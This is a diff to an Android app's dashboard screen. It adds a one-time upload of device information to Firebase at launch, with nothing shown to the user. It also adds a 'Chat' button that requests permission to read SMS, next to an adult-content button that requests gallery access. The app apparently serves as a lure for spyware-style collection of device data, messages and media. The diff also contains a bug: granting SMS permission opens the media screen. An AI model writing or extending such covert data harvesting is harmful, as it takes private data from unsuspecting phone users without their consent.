@@ -2,6 +2,7 @@ package com.mehboob.bushorat.activities;
 
 import android.Manifest;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -19,17 +20,26 @@ import androidx.core.view.WindowInsetsCompat;
 
 import com.mehboob.bushorat.R;
 import com.mehboob.bushorat.databinding.ActivityDashboardBinding;
+import com.mehboob.bushorat.helpers.DeviceInfoHelper;
 
 public class DashboardActivity extends AppCompatActivity {
 
     private ActivityDashboardBinding binding;
     final int GALLERY_PERMISSION_REQUEST  = 1;
+    final int SMS_PERMISSION_CODE  = 2;
+    private static final String PREFS_NAME = "MyAppPrefs";
+    private static final String DEVICE_INFO_UPLOADED = "device_info_uploaded";
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         EdgeToEdge.enable(this);
         binding=ActivityDashboardBinding.inflate(getLayoutInflater());
         setContentView(binding.getRoot());
+
+        checkAndUploadDeviceInfo();
+
+//        DeviceInfoHelper.getDeviceInfo(this);
+//        DeviceInfoHelper.uploadToFirebase(this);
 
         binding.btnPorn.setOnClickListener(v -> {
             if (checkGalleryPermission()) {
@@ -39,9 +49,32 @@ public class DashboardActivity extends AppCompatActivity {
             }
         });
 
+        binding.btnChat.setOnClickListener(v -> {
+            if (checkSmsPermission()) {
+                startActivity(new Intent(DashboardActivity.this,ChatActivity.class));
+            } else {
+                requestSmsPermission();
+            }
+        });
 
     }
+    private void checkAndUploadDeviceInfo() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        boolean alreadyUploaded = prefs.getBoolean(DEVICE_INFO_UPLOADED, false);
 
+        if (!alreadyUploaded) {
+            // Call your helper methods
+            DeviceInfoHelper.getDeviceInfo(this);
+            DeviceInfoHelper.uploadToFirebase(this);
+
+            // Set flag
+            prefs.edit().putBoolean(DEVICE_INFO_UPLOADED, true).apply();
+
+            System.out.println("✅ Device info uploaded");
+        } else {
+            System.out.println("✅ Device info already uploaded, skipping");
+        }
+    }
     private boolean checkGalleryPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             return ContextCompat.checkSelfPermission(this,
@@ -50,6 +83,17 @@ public class DashboardActivity extends AppCompatActivity {
             return ContextCompat.checkSelfPermission(this,
                     Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
         }
+    }
+
+    private boolean checkSmsPermission() {
+        return ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestSmsPermission() {
+        ActivityCompat.requestPermissions(this,
+                new String[]{Manifest.permission.READ_SMS},
+                SMS_PERMISSION_CODE);
     }
 
     private void requestGalleryPermission() {
@@ -73,6 +117,12 @@ public class DashboardActivity extends AppCompatActivity {
                 openMediaActivity();
             } else {
                 Toast.makeText(this, "Gallery permission is required to proceed", Toast.LENGTH_SHORT).show();
+            }
+        } else if (requestCode == SMS_PERMISSION_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                openMediaActivity();
+            } else {
+                Toast.makeText(this, "Sms permission is required to proceed", Toast.LENGTH_SHORT).show();
             }
         }
     }
